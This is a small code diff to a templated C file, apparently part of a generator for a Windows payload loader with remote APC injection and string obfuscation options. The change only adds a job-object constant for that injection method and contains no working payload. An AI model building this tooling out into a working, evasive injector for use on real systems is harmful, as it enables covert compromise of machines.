@@ -33,7 +33,9 @@ char debug_buffer[512];
 {% else %}
 #define DEBUG_PRINT(fmt, ...) // The macro becomes nothing if debug is off
 {% endif %}
-
+{% if execution_method == 'remoteapc' %}
+#define JobObjectFreezeInformation 18
+{% endif %}
 // --- DYNAMICALLY INCLUDE PARTIALS ---
 {% if string_obfuscation_needed %}
     {% include 'partials/deobfuscate_string.c.j2' %}
